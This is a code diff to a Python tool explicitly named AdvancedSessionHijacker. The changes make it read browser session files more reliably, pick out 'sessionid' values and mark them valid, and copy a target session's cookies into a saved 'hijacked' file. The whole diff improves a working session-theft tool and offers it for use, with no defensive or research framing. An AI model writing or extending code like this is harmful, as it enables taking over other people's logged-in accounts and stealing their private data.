@@ -92,8 +92,28 @@ class AdvancedSessionHijacker:
     def analyze_session_file(self, session_file):
         """📊 Analyze a session file"""
         try:
-            with open(session_file, 'r') as f:
-                content = f.read()
+            # Skip binary files (certificates, executables, etc.)
+            if session_file.suffix.lower() in ['.p12', '.pfx', '.cer', '.crt', '.exe', '.bin', '.so']:
+                print(f"⏭️ Skipping binary file: {session_file.name}")
+                return None
+                
+            # Check if file is too large (likely not a session file)
+            if session_file.stat().st_size > 10 * 1024 * 1024:  # 10MB
+                print(f"⏭️ Skipping large file: {session_file.name}")
+                return None
+
+            # Try to read as text first
+            try:
+                with open(session_file, 'r', encoding='utf-8') as f:
+                    content = f.read()
+            except UnicodeDecodeError:
+                # Try different encodings or skip binary files
+                try:
+                    with open(session_file, 'r', encoding='latin-1') as f:
+                        content = f.read()
+                except Exception:
+                    print(f"⏭️ Skipping binary/unreadable file: {session_file.name}")
+                    return None
 
             # Try to parse as JSON
             try:
@@ -120,19 +140,36 @@ class AdvancedSessionHijacker:
                         except Exception:
                             pass
 
+                # Check for other session formats
+                if 'sessionid' in data:
+                    return {
+                        'type': 'simple_session',
+                        'sessionid': data['sessionid'],
+                        'valid': True,
+                        'age': 'unknown'
+                    }
+
                 return {
-                    'type': 'unknown_session',
+                    'type': 'unknown_json',
                     'valid': False,
                     'age': 'unknown'
                 }
             except Exception:
                 # Not JSON, might be plain text session
-                return {
-                    'type': 'plain_session',
-                    'valid': False,
-                    'age': 'unknown'
-                }
-        except Exception:
+                if 'sessionid' in content.lower():
+                    return {
+                        'type': 'plain_session',
+                        'valid': True,
+                        'age': 'unknown'
+                    }
+                else:
+                    return {
+                        'type': 'unknown_text',
+                        'valid': False,
+                        'age': 'unknown'
+                    }
+        except Exception as e:
+            print(f"⚠️ Error analyzing {session_file.name}: {e}")
             return None
 
     def scan_browser_sessions(self):
@@ -170,9 +207,19 @@ class AdvancedSessionHijacker:
         print("-" * 40)
 
         try:
-            # Load target session
-            with open(target_session, 'r') as f:
-                session_data = json.load(f)
+            # Skip binary files
+            target_path = Path(target_session)
+            if target_path.suffix.lower() in ['.p12', '.pfx', '.cer', '.crt', '.exe', '.bin', '.so']:
+                print(f"⏭️ Skipping binary file: {target_path.name}")
+                return None
+
+            # Load target session with encoding handling
+            try:
+                with open(target_session, 'r', encoding='utf-8') as f:
+                    session_data = json.load(f)
+            except (UnicodeDecodeError, json.JSONDecodeError) as e:
+                print(f"❌ Cannot read session file: {e}")
+                return None
 
             if 'cookies' in session_data:
                 hijacked_cookies = session_data['cookies'].copy()
@@ -193,6 +240,9 @@ class AdvancedSessionHijacker:
 
                 print(f"✅ Session hijacked and saved: {hijack_file}")
                 return str(hijack_file)
+            else:
+                print("❌ No cookies found in session file")
+                return None
 
         except Exception as e:
             print(f"❌ Hijack failed: {e}")
